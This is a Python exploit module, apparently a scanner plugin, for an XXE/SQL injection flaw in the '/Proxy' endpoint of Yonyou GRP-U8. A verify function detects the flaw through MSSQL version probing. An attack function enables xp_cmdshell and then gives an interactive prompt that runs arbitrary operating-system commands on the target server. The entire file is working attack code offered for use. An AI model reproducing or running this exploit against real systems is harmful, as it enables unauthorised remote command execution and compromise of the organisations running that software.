import requests
import re, time
import urllib, random, string

def verify(url):
    result = {
        'name': '用友 GRP-U8 Proxy XXE-SQL注入漏洞',
        'vulnerable': False,
        'attack': True,
        'about': 'https://mp.weixin.qq.com/s/zPCLCD-3bEBLK_4GdO9q1Q',
    }
    sqli_payload = "select @@version"
    randstr = ''.join(random.sample(string.digits + string.ascii_letters, 6))
    timeout = 5
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded',
    }
    vurl = urllib.parse.urljoin(url, "/Proxy")
    data = 'cVer=9.8.0&dp=<?xml version="1.0" encoding="GB2312"?><R9PACKET version="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION> <NAME>AS_DataRequest</NAME><PARAMS><PARAM> <NAME>ProviderName</NAME><DATA format="text">DataSetProviderData</DATA></PARAM><PARAM> <NAME>Data</NAME><DATA format="text">{0}</DATA></PARAM></PARAMS> </R9FUNCTION></R9PACKET>'
    try:
        rep = requests.post(vurl, headers=headers, timeout=timeout, data=data.format(sqli_payload), verify=False)
        if rep.status_code == 200 and re.search("Microsoft SQL Server", rep.text):
            rep2 = requests.post(vurl, headers=headers, timeout=timeout, data=data.format(randstr), verify=False)
            if re.search("错误代码", rep2.text) and re.search(randstr, rep2.text):
                result['vulnerable'] = True
        return result
    except:
        return result

def attack(url):
    timeout = 10
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded',
    }
    vurl = urllib.parse.urljoin(url, "/Proxy")
    data = 'cVer=9.8.0&dp=<?xml version="1.0" encoding="GB2312"?><R9PACKET version="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION> <NAME>AS_DataRequest</NAME><PARAMS><PARAM> <NAME>ProviderName</NAME><DATA format="text">DataSetProviderData</DATA></PARAM><PARAM> <NAME>Data</NAME><DATA format="text">{0}</DATA></PARAM></PARAMS> </R9FUNCTION></R9PACKET>'
    try:
        rep = requests.post(vurl, headers=headers, timeout=timeout, data=data.format("select db_name()"), verify=False)
        print("[*] 获取到 db_name: ", re.findall("COLUMN1=\"(.+)\"", rep.text)[0])
        print("[+] 尝试开启 xp_cmdshell ......")
        rep1 = requests.post(vurl, headers=headers, timeout=timeout, data=data.format("use master"), verify=False)
        print("[+] sql: use master")
        rep2 = requests.post(vurl, headers=headers, timeout=timeout, data=data.format("exec sp_configure 'show advanced options',1"), verify=False)
        print("[+] sql: exec sp_configure 'show advanced options',1")
        rep3 = requests.post(vurl, headers=headers, timeout=timeout, data=data.format("reconfigure"), verify=False)
        print("[+] sql: reconfigure")
        rep4 = requests.post(vurl, headers=headers, timeout=timeout, data=data.format("exec sp_configure 'xp_cmdshell',1"), verify=False)
        print("[+] sql: exec sp_configure 'xp_cmdshell',1")
        print("[*] 开启xp_cmdshell成功,开始执行命令(输入exit退出)!")
        xp_cmdshell_payload = "exec xp_cmdshell \"{0}\""
        while True:
            cmd = input("[+] 执行命令 > ")
            try:
                if cmd == "exit":
                    break
                r = requests.post(vurl, headers=headers, timeout=timeout, data=data.format(xp_cmdshell_payload.format(cmd)), verify=False)
                output = re.findall("<ROW output=\"([^\"]+)\"", r.text)
                output_str = ""
                for each in output:
                    output_str += each + "\n"
                if len(output_str) == 0: output_str = r.text
                print("[*] output: ", output_str)
            except:
                print("[-] 超时")
                pass
        return True
    except:
        return False